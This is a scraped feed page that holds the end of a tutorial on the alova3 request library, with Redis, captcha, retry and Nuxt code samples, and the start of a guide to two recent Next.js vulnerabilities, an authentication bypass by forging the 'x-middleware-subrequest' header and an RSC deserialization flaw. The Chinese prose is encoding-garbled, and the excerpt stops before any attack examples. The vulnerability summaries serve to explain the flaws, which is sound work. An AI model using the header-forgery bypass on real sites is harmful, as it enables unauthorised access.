<span class="hljs-keyword">const</span> <span class="hljs-title class_">RedisStorageAdapter</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'@alova/storage-redis'</span>);
<span class="hljs-keyword">const</span> adapterFetch = <span class="hljs-built_in">require</span>(<span class="hljs-string">'alova/fetch'</span>);

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> alovaInstance = <span class="hljs-title function_">createAlova</span>({
  <span class="hljs-comment">// ...</span>
  <span class="hljs-attr">requestAdapter</span>: <span class="hljs-title function_">adapterFetch</span>(),
  <span class="hljs-comment">// redisç¼“å­˜é€‚é…å™¨</span>
  <span class="hljs-attr">l2Cache</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisStorageAdapter</span>({
    <span class="hljs-attr">host</span>: <span class="hljs-string">'localhost'</span>,
    <span class="hljs-attr">port</span>: <span class="hljs-number">6379</span>,
    <span class="hljs-attr">username</span>: <span class="hljs-string">'default'</span>,
    <span class="hljs-attr">password</span>: <span class="hljs-string">'my-top-secret'</span>,
    <span class="hljs-attr">db</span>: <span class="hljs-number">0</span>
  })
});
</code></pre>
<p>ç„¶åå†åˆ›å»ºä¸€ä¸ªéªŒè¯ç æä¾›è€…å‡½æ•°ï¼Œå¹¶æŒ‡å®šä½¿ç”¨redisé€‚é…å™¨ä½œä¸ºç¼“å­˜è½½ä½“ï¼Œä»¥ä¾¿å®ç°åˆ†å¸ƒå¼ç¯å¢ƒä¸‹çš„ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> { createCaptchaProvider } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'alova/server'</span>);

<span class="hljs-keyword">const</span> { sendCaptcha, verifyCaptcha } = <span class="hljs-title function_">createCaptchaProvider</span>({
  <span class="hljs-attr">store</span>: alovaInstance.<span class="hljs-property">options</span>.<span class="hljs-property">l2Cache</span>
});

<span class="hljs-keyword">export</span> sendCaptcha;
<span class="hljs-keyword">export</span> verifyCaptcha;
</code></pre>
<p>ç¬¬ä¸‰æ­¥ï¼Œå†å‘é€éªŒè¯ç ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<code>retry</code>æ¥å®ç°é‡è¯•ï¼Œæé«˜æˆåŠŸç‡ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªå‘é€éªŒè¯ç çš„methodå®ä¾‹</span>
<span class="hljs-keyword">const</span> createCaptchaMethod = (code, key) = &gt; alovaInstance.<span class="hljs-title class_">Post</span>(<span class="hljs-string">'/api/captcha'</span>, {
  code,
  <span class="hljs-attr">email</span>: key,
});

<span class="hljs-comment">// ä½¿ç”¨sendCaptcha hookåŒ…è£…createCaptchaMethod</span>
<span class="hljs-keyword">const</span> captchaMethod = <span class="hljs-title function_">sendCaptcha</span>(createCaptchaMethod, {
  <span class="hljs-attr">key</span>: <span class="hljs-string">'xxx@xxx.com'</span>
});

<span class="hljs-comment">// ä½¿ç”¨retry hookåŒ…è£…captchaMethodï¼Œå¹¶é€šè¿‡awaitå‘é€è¯·æ±‚å¹¶è·å–å“åº”ç»“æœ</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">retry</span>(captchaMethod, {
  <span class="hljs-attr">retry</span>: <span class="hljs-number">3</span>,
  <span class="hljs-attr">backoff</span>: {
    <span class="hljs-attr">delay</span>: <span class="hljs-number">2000</span>
  }
});
</code></pre>
<p>æœ€åä¸€æ­¥ï¼Œé€šè¿‡ç”¨æˆ·çš„æäº¤æ¥éªŒè¯éªŒè¯ç ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> fakeCaptchaFromUserInput = <span class="hljs-string">'1234'</span>;
<span class="hljs-keyword">const</span> isValid = <span class="hljs-keyword">await</span> <span class="hljs-title function_">verifyCaptcha</span>(fakeCaptchaFromUserInput, key);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(isValid ? <span class="hljs-string">'éªŒè¯é€šè¿‡'</span> : <span class="hljs-string">'éªŒè¯ç é”™è¯¯'</span>);
</code></pre>
<h3 data-id="heading-5">å®¢æˆ·ç«¯çš„è¯·æ±‚ç­–ç•¥</h3>
<p>alova3çš„å®¢æˆ·ç«¯è¯·æ±‚ç­–ç•¥ä¸ä¹‹å‰çš„ç‰ˆæœ¬å¤§ç›¸å¾„åº­ï¼Œä¾ç„¶æä¾›äº†<code>useRequest</code>ã€<code>useWatcher</code>ã€<code>usePagination</code>ç­‰UIæ¡†æ¶ç›¸å…³çš„hooksï¼Œåœ¨è¿™é‡Œå¤§å®¶åº”è¯¥éƒ½å¾ˆç†Ÿæ‚‰äº†ï¼Œä½†ä¸åŒçš„æ˜¯ï¼Œæ— è®ºä½ ä½¿ç”¨reactã€vueè¿˜æ˜¯svelteï¼Œè¿™äº›hookéƒ½ç”±ç»Ÿä¸€çš„<code>alova/client</code>ä¸­å¯¼å…¥ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { useRequest } <span class="hljs-keyword">from</span> <span class="hljs-string">'alova/client'</span>;

<span class="hljs-keyword">const</span> { data, loading, error, send } = <span class="hljs-title function_">useRequest</span>(alovaInstance.<span class="hljs-title class_">Get</span>(<span class="hljs-string">'/todo/list'</span>));
</code></pre>
<h3 data-id="heading-6">å…¨æ ˆæ¡†æ¶nuxtæ”¯æŒ</h3>
<p>è™½ç„¶åœ¨ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œalovaå·²ç»æ”¯æŒåœ¨nextã€nuxtã€svelitekitç­‰SSRæ¡†æ¶ä¸­ä½¿ç”¨ï¼Œä¸è¿‡åœ¨alova3ä¸­ï¼Œæä¾›äº†ä¸€ä¸ªä¸“é—¨é€‚é…nuxtçš„statesHookï¼Œå¯ä»¥åœ¨ä½¿ç”¨<code>useRequest</code>ã€<code>useWatcher</code>ç­‰å‡ ä¹æ‰€æœ‰çš„hooksæ—¶ä¸ä»…å¯ä»¥åŒæ­¥ä¸¤ç«¯çš„æ•°æ®ï¼Œåƒå†…ç½®çš„<code>useFetch</code>ä¸€æ ·é¿å…åœ¨å®¢æˆ·ç«¯é‡å¤è¯·æ±‚ï¼Œè¿˜å¯ä»¥åŒæ­¥ä¾‹å¦‚<code>Date</code>ï¼Œ<code>Error</code>ç­‰ä»¥åŠè‡ªå®šä¹‰ç±»å‹çš„æ•°æ®ï¼Œç”¨æ³•ä¹Ÿéå¸¸ç®€å•ï¼Œè®¾ç½®ä¸€ä¸‹<code>NuxtHook</code>å³å¯ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { createAlova } <span class="hljs-keyword">from</span> <span class="hljs-string">'alova'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">NuxtHook</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'alova/nuxt'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> alovaInstance = <span class="hljs-title function_">createAlova</span>({
  <span class="hljs-comment">// ...</span>
  <span class="hljs-attr">statesHook</span>: <span class="hljs-title class_">NuxtHook</span>({
    <span class="hljs-attr">nuxtApp</span>: useNuxtApp <span class="hljs-comment">// å¿…é¡»æŒ‡å®šuseNuxtApp</span>
  })
});
</code></pre>
<h2 data-id="heading-7">ä¸‰ã€å·¥å…·é“¾æ”¯æŒï¼šæ›´åŠ ç°ä»£åŒ–çš„OpenAPIå·¥å…·</h2>
<p>é™¤äº†æ ¸å¿ƒåº“çš„å¢å¼ºï¼Œalova3è¿˜æä¾›äº†å¼€å‘å·¥å…·å’Œvscodeæ‰©å±•æ¥ä¼˜åŒ–å·¥ä½œæµã€‚</p>
<p>å¦‚æœä½ çš„é¡¹ç›®æ”¯æŒopenapiï¼Œè¿™äº›å¼€å‘å·¥å…·å¯ä»¥åŸºæœ¬æ¶ˆé™¤APIæ–‡æ¡£ï¼Œè®©ä½ ç›´æ¥åœ¨ç¼–è¾‘å™¨ä¸­æŸ¥æ‰¾æ¥å£ã€æŸ¥çœ‹å®Œæ•´æ–‡æ¡£å¹¶äº¤äº’å¼åœ°å¿«é€Ÿæ’å…¥æ¥å£çš„è°ƒç”¨ä»£ç ï¼Œå¾ˆå¤§ç¨‹åº¦åœ°æå‡äº†å¼€å‘æ•ˆç‡å’Œä½“éªŒã€‚</p>
<p>åŒæ—¶ï¼Œä½ è¿˜å¯ä»¥å®Œå…¨æ§åˆ¶openapiåœ¨å‰ç«¯ç”Ÿæˆçš„å†…å®¹ï¼Œä¾‹å¦‚è¿‡æ»¤æ‰æŸäº›æ¥å£ï¼Œæ–°å¢ã€åˆ é™¤æˆ–ä¿®æ”¹æŸä¸ªæ¥å£çš„å‚æ•°ç­‰ï¼Œè¿™äº›åœ¨openapiæ–‡ä»¶ä¸å¤Ÿè§„èŒƒï¼Œæˆ–è€…æœ‰é”™è¯¯æ—¶éå¸¸æœ‰ç”¨ï¼Œå¹¶ä¸”æ˜¯å…¶ä»–openapiè‡ªåŠ¨ç”Ÿæˆå·¥å…·æ‰€ä¸å…·å¤‡çš„ã€‚</p>
<p>ä¸€èµ·æ¥å…·ä½“çœ‹çœ‹æ€ä¹ˆå›äº‹ã€‚</p>
<h3 data-id="heading-8">å¿«é€ŸæŸ¥æ‰¾å’Œæ’å…¥è°ƒç”¨ä»£ç </h3>
<h3 data-id="heading-9">è‡ªå®šä¹‰ä¿®æ”¹ç”Ÿæˆå†…å®¹</h3>
<p>åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒæœåŠ¡ç«¯çš„è¿”å›æ•°æ®æ ¼å¼ä¼šå¤–åŒ…ä¸€å±‚ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-attr">code</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">message</span>: <span class="hljs-string">"success"</span>,
  <span class="hljs-attr">data</span>: {
    <span class="hljs-comment">// ...</span>
  }
}
</code></pre>
<p>è€Œæ­¤æ—¶æˆ‘ä»¬å¸Œæœ›ç”Ÿæˆçš„å“åº”æ•°æ®ç±»å‹ä¸º<code>response.data</code>ï¼Œä½ å¯ä»¥åœ¨alovaé…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨<code>payloadModifier</code>æ’ä»¶ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'@alova/wormhole'</span>;
<span class="hljs-keyword">import</span> { payloadModifier } <span class="hljs-keyword">from</span> <span class="hljs-string">'@alova/wormhole/plugin'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">generator</span>: [
    {
      <span class="hljs-comment">// ...</span>
      <span class="hljs-attr">plugin</span>: [
        <span class="hljs-title function_">payloadModifier</span>([
          {
            <span class="hljs-attr">scope</span>: <span class="hljs-string">'response'</span>,
            <span class="hljs-attr">handler</span>: <span class="hljs-function"><span class="hljs-params">schema</span> =&gt;</span> schema.<span class="hljs-property">data</span>
          }
        ])
      ]
    }
  ]
});
</code></pre>
<p>ä½ ä¹Ÿè¿˜å¯ä»¥é€šè¿‡<code>handleApi</code>å®ç°å®Œå…¨çš„è‡ªå®šä¹‰ï¼Œä¾‹å¦‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªä¿®æ”¹tagçš„ä¾‹å­ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">generator</span>: [
    {
      <span class="hljs-attr">handleApi</span>: <span class="hljs-function"><span class="hljs-params">apiDescription</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (apiDescription.<span class="hljs-property">url</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/user'</span>)) {
          apiDescription.<span class="hljs-property">tags</span> = [<span class="hljs-string">'userTag'</span>];
        }
        <span class="hljs-keyword">return</span> apiDescription;
      }
    }
  ]
});
</code></pre>
<h3 data-id="heading-10">è¾¹æŸ¥è¾¹æ¥å…¥æ¥å£</h3>
<p>ä½¿ç”¨alovaçš„vscodeæ‰©å±•ï¼Œä½ å¯ä»¥ç›´æ¥åœ¨ç¼–è¾‘å™¨ä¸­æŸ¥æ‰¾æ¥å£ï¼Œå¹¶ç›´æ¥æ’å…¥è°ƒç”¨ä»£ç ï¼Œä¸ä»…å¦‚æ­¤ï¼Œæ¥å£çš„æ‰€æœ‰ç›¸å…³ä¿¡æ¯éƒ½å¯ä»¥ç›´æ¥åœ¨ä»£ç ä¸­æŸ¥çœ‹ï¼Œåƒè¿™æ ·ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf48e785e23b487eac71aa3b41a98ea6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-k6Z-1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765931728&amp;x-signature=3QJ%2FgaMng%2FpTCDoERIcQXiTqgi4%3D" alt="image.png" loading="lazy"/></p>
<p>å¼¹æ¡†ä¸­èƒ½æ¸…æ¥šçš„çœ‹åˆ°æ¥å£çš„æè¿°ä¿¡æ¯ã€è¯·æ±‚å‚æ•°ã€å“åº”å‚æ•°ç­‰ï¼Œä½ å¯ä»¥ä¸€è¾¹çœ‹ç€å¼¹æ¡†ä¸­çš„å‚æ•°ï¼Œä¸€è¾¹åœ¨ä»£ç ä¸­ä¼ å‚ï¼Œè¿™ä¸ªç‚¹å­å¤ªæ£’å•¦ï¼Œå†ä¹Ÿä¸ç”¨åœ¨apiæ–‡æ¡£å’Œç¼–è¾‘å™¨ä¸­æ¥å›åˆ‡æ¢ï¼Œç„¶åæ¯æ¬¡è¿˜è¦é‡æ–°æ‰¾å¯¹åº”ä¿¡æ¯äº†ã€‚</p>
<h3 data-id="heading-11">ç¼–è¾‘å™¨ä¸­çš„apiæ–‡æ¡£</h3>
<p>è¿™ä¸ªvscodeæ‰©å±•è¿˜æä¾›äº†åœ¨ç¼–è¾‘å™¨ä¸­æŸ¥çœ‹æ¥å£æ–‡æ¡£çš„åŠŸèƒ½ï¼Œä½ å¯ä»¥ç›´æ¥åœ¨ç¼–è¾‘çš„ä¾§è¾¹æ ä¸­æŸ¥çœ‹æ¥å£æ–‡æ¡£ï¼Œå°±åƒè¿™æ ·ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f1d07da3dfe49b7ac83c6401f3b9048~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-k6Z-1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765931728&amp;x-signature=R3G9Glf0284RekqbQLBZ1n3cIPI%3D" alt="" loading="lazy"/></p>
<p>ä¹Ÿå¯ä»¥åœ¨ä»£ç ä¸­çš„è°ƒç”¨ä»£ç ä¸Šç›´æ¥ç‚¹å‡»â€œview documentationâ€æ‰“å¼€å¯¹åº”çš„æ¥å£æ–‡æ¡£ï¼Œå¯ä»¥å®ç°å¿«é€ŸæŸ¥çœ‹æ¥å£çš„æè¿°ä¿¡æ¯ã€è¯·æ±‚å‚æ•°ã€å“åº”å‚æ•°ç­‰ã€‚</p>
<h2 data-id="heading-12">å†™åœ¨æœ€å</h2>
<p>åˆ°è¿™é‡Œï¼Œä½ åº”è¯¥æ„Ÿå—åˆ°äº†ä¸€ç‚¹alova3çš„ä¸åŒäº†å§ï¼Œé€šè¿‡ä»¥ä¸Šçš„æ–¹å¼è®©å‰ç«¯åœ¨æ¥å£é›†æˆæ–¹å‘å¾ˆå¤§ç¨‹åº¦åœ°æå‡æ•ˆç‡ï¼Œæ— è®ºä½ æ˜¯å‰ç«¯å¼€å‘è€…å¸Œæœ›æå‡åº”ç”¨æ€§èƒ½ï¼Œè¿˜æ˜¯åç«¯å·¥ç¨‹å¸ˆéœ€è¦æ„å»ºé«˜æ•ˆçš„APIç½‘å…³ï¼Œäº¦æˆ–æ˜¯å…¨æ ˆå¼€å‘è€…è¿½æ±‚ç»Ÿä¸€çš„å¼€å‘ä½“éªŒï¼Œalova3éƒ½èƒ½ä¸ºä½ æä¾›å®Œæ•´çš„æ”¯æŒã€‚</p>
<p>å¦‚æœè§‰å¾—alovaè¿˜ä¸é”™ï¼ŒçœŸè¯šå¸Œæœ›ä½ å¯ä»¥<a href="https://link.juejin.cn?target=https%3A%2F%2Falova.js.org%2Fexamples" target="_blank" title="https://alova.js.org/examples" ref="nofollow noopener noreferrer">å°è¯•ä½“éªŒä¸€ä¸‹</a>ï¼Œä¹Ÿå¯ä»¥ç»™æˆ‘ä»¬æ¥ä¸€ä¸ªå…è´¹çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Falovajs%2Falova" target="_blank" title="https://github.com/alovajs/alova" ref="nofollow noopener noreferrer">github stars</a>ã€‚</p>
<p>è®¿é—®alovajsçš„å®˜ç½‘æŸ¥çœ‹æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Falova.js.org" target="_blank" title="https://alova.js.org" ref="nofollow noopener noreferrer">alovajså®˜ç½‘</a>ã€‚</p>
<p>æœ‰å…´è¶£å¯ä»¥åŠ å…¥æˆ‘ä»¬çš„äº¤æµç¤¾åŒºï¼Œåœ¨ç¬¬ä¸€æ—¶é—´è·å–åˆ°æœ€æ–°è¿›å±•ï¼Œä¹Ÿèƒ½ç›´æ¥å’Œå¼€å‘å›¢é˜Ÿäº¤æµï¼Œæå‡ºä½ çš„æƒ³æ³•å’Œå»ºè®®ã€‚</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Falova.js.org%2Fimg%2Fwechat_qrcode.jpg" target="_blank" title="https://alova.js.org/img/wechat_qrcode.jpg" ref="nofollow noopener noreferrer">åŠ å…¥å¾®ä¿¡ç¾¤å‚ä¸äº¤æµ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdiscord.gg%2FS47QGJgkVb" target="_blank" title="https://discord.gg/S47QGJgkVb" ref="nofollow noopener noreferrer">åŠ å…¥åœ¨ Discord ç¤¾åŒºå‚ä¸äº¤æµ</a></li>
</ul>
<p>æœ‰ä»»ä½•é—®é¢˜ï¼Œä½ å¯ä»¥åŠ å…¥ä»¥ä¸‹ç¾¤èŠå’¨è¯¢ï¼Œä¹Ÿå¯ä»¥åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Falovajs%2Falova%2Fdiscussions" target="_blank" title="https://github.com/alovajs/alova/discussions" ref="nofollow noopener noreferrer">github ä»“åº“ä¸­å‘å¸ƒ Discussions</a>ï¼Œå¦‚æœé‡åˆ°é—®é¢˜ï¼Œä¹Ÿè¯·åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Falovajs%2Falova%2Fissues" target="_blank" title="https://github.com/alovajs/alova/issues" ref="nofollow noopener noreferrer">github çš„ issues</a>ä¸­æäº¤ï¼Œæˆ‘ä»¬ä¼šåœ¨æœ€å¿«çš„æ—¶é—´è§£å†³ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Next.js è¿‘æœŸé«˜å±æ¼æ´å®Œæ•´æŒ‡å—ï¼šåŸç† + æ”»å‡»ç¤ºä¾‹ï¼ˆå‰ç«¯æ˜“æ‡‚ç‰ˆï¼‰]]></title>    <link>https://juejin.cn/post/7581702285564379186</link>    <guid>https://juejin.cn/post/7581702285564379186</guid>    <pubDate>2025-12-10T02:20:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581702285564379186" data-draft-id="7581702285564362802" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Next.js è¿‘æœŸé«˜å±æ¼æ´å®Œæ•´æŒ‡å—ï¼šåŸç† + æ”»å‡»ç¤ºä¾‹ï¼ˆå‰ç«¯æ˜“æ‡‚ç‰ˆï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,Next.js"/> <meta itemprop="datePublished" content="2025-12-10T02:20:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é²«å°é±¼"/> <meta itemprop="url" content="https://juejin.cn/user/1046390798032110"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Next.js è¿‘æœŸé«˜å±æ¼æ´å®Œæ•´æŒ‡å—ï¼šåŸç† + æ”»å‡»ç¤ºä¾‹ï¼ˆå‰ç«¯æ˜“æ‡‚ç‰ˆï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390798032110/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é²«å°é±¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:20:08.000Z" title="Wed Dec 10 2025 02:20:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    42
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Next.js è¿‘æœŸé«˜å±æ¼æ´å®Œæ•´æŒ‡å—ï¼šåŸç† + æ”»å‡»ç¤ºä¾‹ï¼ˆå‰ç«¯æ˜“æ‡‚ç‰ˆï¼‰</h2>
<h3 data-id="heading-1">ä¸€ã€æ¼æ´æ ¸å¿ƒä¿¡æ¯é€Ÿè§ˆï¼ˆå‰ç«¯å¿…çŸ¥ï¼‰</h3>
<h4 data-id="heading-2">1. äº‹ä»¶èƒŒæ™¯ï¼ˆæ—¶é—´ + èµ·å› ï¼‰</h4>
<ul>
<li>
<p><strong>CVE-2025-29927ï¼ˆèº«ä»½éªŒè¯ç»•è¿‡ï¼‰</strong>ï¼š2025 å¹´ 3 æœˆå…¬å¼€ï¼Œå®é™…éšè— 4 å¹´ï¼å½±å“ Next.js 11.1.4 ~ 15.2.2 ç‰ˆæœ¬ï¼Œèµ·å› æ˜¯ä¸­é—´ä»¶å¯¹ <code>x-middleware-subrequest</code> è¯·æ±‚å¤´æ ¡éªŒå¤ªå®½æ¾ï¼Œå¤–éƒ¨å¯ä¼ªé€ ã€‚</p>
</li>
<li>
<p><strong>CVE-2025-66478ï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œ RCEï¼‰</strong>ï¼š2025 å¹´ 12 æœˆ 4 æ—¥æŠ«éœ²ï¼ŒCVSS 10.0ï¼ˆæœ€é«˜å±ï¼‰ï¼Œå½±å“ Next.js 15/16 åŠéƒ¨åˆ† 14.x æµ‹è¯•ç‰ˆï¼Œæºäº React Server Componentsï¼ˆRSCï¼‰åè®®çš„ååºåˆ—åŒ–æ¼æ´ï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œæ¶æ„è¯·æ±‚é‡Œçš„å‘½ä»¤ã€‚</p>
</li>
</ul>
<h4 data-id="heading-3">2. æ¼æ´åŸç†ï¼ˆé€šä¿—è§£é‡Šï¼‰</h4>
<ul>
<li>
<p>ç»•è¿‡æ¼æ´ï¼šNext.js ä¸­é—´ä»¶æŠŠ <code>x-middleware-subrequest</code> å½“ä½œ â€œå†…éƒ¨è¯·æ±‚æ ‡è¯†â€ï¼Œä½†æ²¡éªŒè¯æ˜¯å¦çœŸçš„æ˜¯å†…éƒ¨å‘çš„ï¼Œæ”»å‡»è€…æ‹¼å‡ ä¸ªåˆæ³•å€¼å°±èƒ½éª—ä¸­é—´ä»¶æ”¾è¡Œã€‚</p>
</li>
<li>
